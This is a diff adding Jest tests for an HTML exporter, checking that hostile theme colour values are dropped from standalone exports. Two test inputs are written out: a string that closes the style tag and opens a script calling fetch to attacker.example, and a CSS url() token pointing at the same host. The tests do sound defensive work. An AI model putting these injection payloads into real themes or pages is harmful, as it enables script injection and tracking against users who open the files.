@@ -121,3 +121,57 @@ describe("escapeHtml", () => {
     expect(_escapeHtml(`<a href="x">&`)).toBe("&lt;a href=&quot;x&quot;&gt;&amp;");
   });
 });
+
+describe("a hostile theme in the export", () => {
+  /**
+   * `ThemeSchema` refuses these values now, so this cannot arrive through
+   * `parseThemeFile`. The object is built by hand precisely to skip that check:
+   * this asserts the exporter is safe on its own, not merely downstream of a
+   * validator. The existing tests above only ever exercise `PRESETS[0]`, which is
+   * why the hole survived — a preset has nothing hostile in it to find.
+   */
+  function hostileTheme(value: string) {
+    const base = structuredClone(theme);
+    base.colors.bg = value;
+    return base;
+  }
+
+  it("does not let a colour close the style element and open a script", () => {
+    const html = buildStandaloneHtml({
+      title: "Guide",
+      theme: hostileTheme("#fff</style><script>fetch('https://attacker.example')</script>"),
+      article: article("<p>Hello</p>"),
+      documentCss: "",
+    });
+
+    expect(html).not.toContain("<script");
+    expect(html).not.toContain("attacker.example");
+    // The document itself still exports; one unusable token is dropped, not the file.
+    expect(html).toContain("<p>Hello</p>");
+  });
+
+  it("drops a token carrying url(), which would fetch when the file is opened", () => {
+    const html = buildStandaloneHtml({
+      title: "Guide",
+      theme: hostileTheme("url(https://attacker.example/pixel.png)"),
+      article: article("<p>Hello</p>"),
+      documentCss: "",
+    });
+
+    expect(html).not.toContain("attacker.example");
+  });
+
+  it("keeps every ordinary token", () => {
+    const html = buildStandaloneHtml({
+      title: "Guide",
+      theme,
+      article: article("<p>Hello</p>"),
+      documentCss: "",
+    });
+
+    // A dropped token would silently change how every export looks, so the
+    // filter has to be inert for real themes.
+    expect(html).toContain("--doc-bg:");
+    expect(html).toContain("--doc-text:");
+  });
+});
